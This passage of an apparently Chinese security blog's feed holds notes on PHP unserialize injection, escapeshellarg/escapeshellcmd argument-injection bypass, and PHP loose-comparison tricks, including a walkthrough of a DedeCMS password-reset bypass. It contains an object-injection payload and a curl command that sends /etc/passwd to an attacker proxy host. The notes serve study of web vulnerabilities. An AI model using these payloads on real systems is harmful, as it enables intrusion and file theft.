&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;two&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$test2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;test2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;unserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'admin'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;传入$test=two,从而调用two中的action(),payload如下&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	O:4:&quot;tom1&quot;:1:{s:4:&quot;test&quot;;O:3:&quot;two&quot;:1:{s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;}}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;0x06-参考&quot;&gt;0x06 参考&lt;/h5&gt;

&lt;p&gt;https://www.anquanke.com/post/id/86452
https://www.anquanke.com/post/id/84922&lt;/p&gt;</content><author><name></name></author><category term="Web安全" /><summary type="html">0x00 关注函数 Command Execution exec() shell_exec() pcntl_exec() passthru() popen() system() assert() eval()</summary></entry><entry><title type="html">escapeshellarg&amp;amp;escapeshellcmd&amp;amp;curl</title><link href="http://localhost:4000/escapeshellarg-escapeshellcmd/" rel="alternate" type="text/html" title="escapeshellarg&amp;escapeshellcmd&amp;curl" /><published>2018-03-06T03:50:30-05:00</published><updated>2018-03-06T03:50:30-05:00</updated><id>http://localhost:4000/escapeshellarg-escapeshellcmd</id><content type="html" xml:base="http://localhost:4000/escapeshellarg-escapeshellcmd/">&lt;p&gt;parse_url()  处理url 各个部分为关联数组
strtolower()  转小写&lt;/p&gt;

&lt;h3 id=&quot;escapeshellarg&quot;&gt;escapeshellarg()&lt;/h3&gt;
&lt;p&gt;将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号
例如&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	echo escapeshellarg(&quot;127.0.0.1' -T /etc/passwd&quot;);
	结果为 '127.0.0.1'\'' -T /etc/passwd' 
	先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;escapeshellcmd&quot;&gt;escapeshellcmd()&lt;/h3&gt;
&lt;p&gt;对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 
反斜线（\）会在以下字符之前插入：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;amp;#;`|*?~&amp;lt;&amp;gt;^()[]{}$\, \x0A 和 \xFF。
 ' 和 &quot; 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;例子&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	$url = &quot;127.0.0.1' -T /etc/passwd&quot;;
	escapeshellarg($url);
	escapeshellcmd($url);
	echo $url;
	运行后url为127.0.0.1\ -T /etc/passwd'
	escapeshellcmd('127.0.0.1'\'' -T /etc/passwd')对\转译后面多个',转义',即'172.17.0.2'\\'' -T /etc/passwd\'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;curl -T /etc/passwd’ url 时有‘ 不会成功读取passwd，so
mou表格姿势&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	curl 'http://baidu.com/'\'' -F file=@/etc/passwd -x vps:9999'
	\是已被转义的 最后的' 对代理没影响 对curl版本有要求
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;curl&quot;&gt;curl&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	curl -F 可以提交表单或文件
	curl -o 指定文件名写文件 可写shell
	curl -T 向服务器put文件  curl -T flag.php -x vps:port
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="Web安全" /><summary type="html">parse_url() 处理url 各个部分为关联数组 strtolower() 转小写</summary></entry><entry><title type="html">php弱类型小结</title><link href="http://localhost:4000/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%B0%8F%E7%BB%93/" rel="alternate" type="text/html" title="php弱类型小结" /><published>2018-03-04T03:50:30-05:00</published><updated>2018-03-04T03:50:30-05:00</updated><id>http://localhost:4000/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%B0%8F%E7%BB%93</id><content type="html" xml:base="http://localhost:4000/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%B0%8F%E7%BB%93/">&lt;blockquote&gt;
  &lt;p&gt;php弱类型一般来说 定义变量不需要声明类型，可以任意类型变量或值赋值给变量。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;str---int-rule&quot;&gt;str -&amp;gt; int rule&lt;/h3&gt;
&lt;p&gt;==为松散比较，数字和字符串比较时，字符串转为数字(rule：取字符串开头第一个,若为数字,则从第一个数字开始直到不是数字的为转换结果，否则为0)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	var_dump(1 == '1')	//true
	var_dump(2 == '2ewfs')	//true
	var_dump(234 == '23wdf')	//flase
	var_dump(234 == '234wdf')   //true
	var_dump(234 == '234w5456df')  //true
	var_dump(234 == '2w5456df')    //flase
	0 == '0' =&amp;gt; true
	0 == 'abcd' =&amp;gt; true
	1 == '1abcd' =&amp;gt; true
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;若一个为整数则另一个转为整数&lt;/p&gt;

&lt;h4 id=&quot;其他&quot;&gt;其他&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	null == '' == 0 == &quot;0&quot; == array() == false =&amp;gt; true (多个松散比较任取2个为true)		
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;数学计算&quot;&gt;数学计算&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	&quot;0e132456789&quot;==&quot;0e7124511451155&quot; //true
	&quot;0e123456abc&quot;==&quot;0e1dddada&quot;	//false
	&quot;0e1abc&quot;==&quot;0&quot;     //false
	md5('s878926199a') == 0 =&amp;gt; true
	这里是 md5('s878926199a') 的值是 0e 开头 e后全是数字则科学计算后比较

	'0x001'=='1' =&amp;gt; true 0x开头的16进制转为10进制比较
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;函数&quot;&gt;函数&lt;/h4&gt;
&lt;h5 id=&quot;switch&quot;&gt;switch&lt;/h5&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	$j =&quot;3ab&quot;;
	switch ($j)  switch会转为整数即3
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;in_arrayarray_search&quot;&gt;in_array()&amp;amp;array_search()&lt;/h5&gt;
&lt;p&gt;in_array()函数的解释是bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ),如果strict参数没有提供
则会用松散比较&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	$array=[0,1,2,'3'];
	var_dump(in_array('abc', $array));  //true
	var_dump(in_array('2bc', $array));	//true
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;strcmp&quot;&gt;strcmp()&lt;/h5&gt;
&lt;p&gt;strcmp()函数是int strcmp ( string $str1 , string $str2 ),需要给strcmp()传递2个string类型的参数。如果str1小于str2,返回-1，相等返回0，否则返回1。strcmp函数是将两个变量转换为ascii，然后进行减法运算，然后根据运算结果来决定返回值。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	$array=[1,2,3];
	var_dump(strcmp($array,'123')); //null,null在宽松比较是false。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;empty&quot;&gt;Empty&lt;/h4&gt;
&lt;p&gt;empty 返回 TRUE的情况：
若变量不存在则返回 TRUE
若变量存在且其值为”“、0、”0”、NULL、、FALSE、array()、var $var; 以及没有任何属性的对象，则返回 TURE&lt;/p&gt;

&lt;h3 id=&quot;官方图&quot;&gt;官方图&lt;/h3&gt;
&lt;p&gt;使用PHP函数对变量$x进行比较：
&lt;img src=&quot;https://raw.githubusercontent.com/tom0li/tom0li.github.io/master/img/php弱类型1.png&quot; alt=&quot;php弱类型1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;松散比较(==)
&lt;img src=&quot;https://raw.githubusercontent.com/tom0li/tom0li.github.io/master/img/php弱类型2.png&quot; alt=&quot;php弱类型2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;严格比较(===)
&lt;img src=&quot;https://raw.githubusercontent.com/tom0li/tom0li.github.io/master/img/php弱类型3.png&quot; alt=&quot;php弱类型3&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;dede-v5772弱类型重置密码&quot;&gt;dede V5.7.72弱类型重置密码&lt;/h3&gt;
&lt;p&gt;文件位置:dedecms/member/resetpassword.php(75行)&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;else if($dopost == &quot;safequestion&quot;)
{
    $mid = preg_replace(&quot;#[^0-9]#&quot;, &quot;&quot;, $id);
    $sql = &quot;SELECT safequestion,safeanswer,userid,email FROM #@__member WHERE mid = '$mid'&quot;;
    $row = $db-&amp;gt;GetOne($sql);
    if(empty($safequestion)) $safequestion = '';
 
    if(empty($safeanswer)) $safeanswer = '';
 
    if($row['safequestion'] == $safequestion &amp;amp;&amp;amp; $row['safeanswer'] == $safeanswer)
    {
        sn($mid, $row['userid'], $row['email'], 'N');
        exit();
    }
    else
    {
        ShowMsg(&quot;对不起，您的安全问题或答案回答错误&quot;,&quot;-1&quot;);
        exit();
    }
 
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;系统默认问题是”0”，答案是空. php 弱类型绕过，empty函数在判断0.0，0e2时不为空，”0”==”0.0”为真&lt;/p&gt;

&lt;p&gt;sn函数(/member/inc/inc_pwd_functions.php)&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function sn($mid,$userid,$mailto, $send = 'Y')
{
    global $db;
    $tptim= (60*10);
    $dtime = time();
    $sql = &quot;SELECT * FROM #@__pwd_tmp WHERE mid = '$mid'&quot;;
    $row = $db-&amp;gt;GetOne($sql);
    if(!is_array($row))
    {
        //发送新邮件；
        newmail($mid,$userid,$mailto,'INSERT',$send);
    }
    //10分钟后可以再次发送新验证码；
    elseif($dtime - $tptim &amp;gt; $row['mailtime'])
    {
        newmail($mid,$userid,$mailto,'UPDATE',$send);
    }
    //重新发送新的验证码确认邮件；
    else
    {
        return ShowMsg('对不起，请10分钟后再重新申请', 'login.php');
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;根据id在表中判断是否存在用户数据，第一次忘记密码时 $row为空，进入newmail函数&lt;/p&gt;

&lt;p&gt;newmail函数(dedecms/member/inc/inc_pwd_functions.php)&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function newmail($mid, $userid, $mailto, $type, $send)
{
    global $db,$cfg_adminemail,$cfg_webname,$cfg_basehost,$cfg_memberurl;
    $mailtime = time();
    $randval = random(8);
    $mailtitle = $cfg_webname.&quot;:密码修改&quot;;
    $mailto = $mailto;
    $headers = &quot;From: &quot;.$cfg_adminemail.&quot;\r\nReply-To: $cfg_adminemail&quot;;
    $mailbody = &quot;亲爱的&quot;.$userid.&quot;：\r\n您好！感谢您使用&quot;.$cfg_webname.&quot;网。\r\n&quot;.$cfg_webname.&quot;应您的要求，重新设置密码：（注：如果您没有提出申请，请检查您的信息是否泄漏。）\r\n本次临时登陆密码为：&quot;.$randval.&quot; 请于三天内登陆下面网址确认修改。\r\n&quot;.$cfg_basehost.$cfg_memberurl.&quot;/resetpassword.php?dopost=getpasswd&amp;amp;id=&quot;.$mid;
    if($type == 'INSERT')
    {
        $key = md5($randval);
        $sql = &quot;INSERT INTO `#@__pwd_tmp` (`mid` ,`membername` ,`pwd` ,`mailtime`)VALUES ('$mid', '$userid',  '$key', '$mailtime');&quot;;
        if($db-&amp;gt;ExecuteNoneQuery($sql))
        {
            if($send == 'Y')
            {
                sendmail($mailto,$mailtitle,$mailbody,$headers);
                return ShowMsg('EMAIL修改验证码已经发送到原来的邮箱请查收', 'login.php','','5000');
            } else if ($send == 'N')
            {
                return ShowMsg('稍后跳转到修改页', $cfg_basehost.$cfg_memberurl.&quot;/resetpassword.php?dopost=getpasswd&amp;amp;id=&quot;.$mid.&quot;&amp;amp;key=&quot;.$randval);
            }
        }
        else
        {
            return ShowMsg('对不起修改失败，请联系管理员', 'login.php');
        }
    }
    elseif($type == 'UPDATE')
    {
        $key = md5($randval);
        $sql = &quot;UPDATE `#@__pwd_tmp` SET `pwd` = '$key',mailtime = '$mailtime'  WHERE `mid` ='$mid';&quot;;
        if($db-&amp;gt;ExecuteNoneQuery($sql))
        {
            if($send == 'Y')
            {
                sendmail($mailto,$mailtitle,$mailbody,$headers);
                ShowMsg('EMAIL修改验证码已经发送到原来的邮箱请查收', 'login.php');
            }
            elseif($send == 'N')
            {
                return ShowMsg('稍后跳转到修改页', $cfg_basehost.$cfg_memberurl.&quot;/resetpassword.php?dopost=getpasswd&amp;amp;id=&quot;.$mid.&quot;&amp;amp;key=&quot;.$randval);
            }
        }
        else
        {
            ShowMsg('对不起修改失败，请与管理员联系', 'login.php');
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;进入$type == ‘INSERT’中，再次发送验证码进入UPDATE中，然后进入$send == ‘N’(默认为”N”),修改url中mid为用户可控的参数member_id，key也有了&lt;/p&gt;

&lt;p&gt;重置页面 dedecms/member/resetpassword.php&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;else if($dopost == &quot;getpasswd&quot;)
{
    //修改密码
    if(empty($id))
    {
        ShowMsg(&quot;对不起，请不要非法提交&quot;,&quot;login.php&quot;);
        exit();
    }
    $mid = preg_replace(&quot;#[^0-9]#&quot;, &quot;&quot;, $id);
    $row = $db-&amp;gt;GetOne(&quot;SELECT * FROM #@__pwd_tmp WHERE mid = '$mid'&quot;);
    if(empty($row))
    {
        ShowMsg(&quot;对不起，请不要非法提交&quot;,&quot;login.php&quot;);
        exit();
    }
    if(empty($setp))
    {
        $tptim= (60*60*24*3);
        $dtime = time();
        if($dtime - $tptim &amp;gt; $row['mailtime'])
        {
            $db-&amp;gt;executenonequery(&quot;DELETE FROM `#@__pwd_tmp` WHERE `md` = '$id';&quot;);
            ShowMsg(&quot;对不起，临时密码修改期限已过期&quot;,&quot;login.php&quot;);
            exit();
        }
        require_once(dirname(__FILE__).&quot;/templets/resetpassword2.htm&quot;);
    }
    elseif($setp == 2)
    {
        if(isset($key)) $pwdtmp = $key;
 
        $sn = md5(trim($pwdtmp));
        if($row['pwd'] == $sn)
        {
            if($pwd != &quot;&quot;)
            {
                if($pwd == $pwdok)
                {
                    $pwdok = md5($pwdok);
                    $sql = &quot;DELETE FROM `#@__pwd_tmp` WHERE `mid` = '$id';&quot;;
                    $db-&amp;gt;executenonequery($sql);
                    $sql = &quot;UPDATE `#@__member` SET `pwd` = '$pwdok' WHERE `mid` = '$id';&quot;;
                    if($db-&amp;gt;executenonequery($sql))
                    {
                        showmsg('更改密码成功，请牢记新密码', 'login.php');
                        exit;
                    }
                }
            }
            showmsg('对不起，新密码为空或填写不一致', '-1');
            exit;
        }
        showmsg('对不起，临时密码错误', '-1');
        exit;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;首先 empty($id)判断是否重置密码，empty($setp)判断是否超时，然后密码修改，判断md5(key)是否等库中pwd，后修改&lt;/p&gt;</content><author><name></name></author><category term="Web安全" /><summary type="html">php弱类型一般来说 定义变量不需要声明类型，可以任意类型变量或值赋值给变量。</summary></entry></feed>